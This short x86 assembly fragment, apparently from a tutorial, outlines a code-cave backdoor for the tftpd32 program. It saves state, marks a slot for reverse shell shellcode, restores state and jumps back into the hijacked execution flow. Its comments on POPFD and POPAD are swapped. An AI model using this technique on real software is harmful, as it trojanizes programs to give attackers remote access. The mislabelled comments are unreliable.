PUSHAD ; Save the register values
PUSHFD ; Save the flag values
... reverse shell shellcode
... align stack ; Align ESP with where we saved our stack registers!
POPFD ; Restore the original register values
POPAD ; Restore the original flag values
CALL tftpd32.0041B7DE ; The first instruction we overwrote (hijack)
JMP 00411363 ; Jump to the command that was to be executed next.
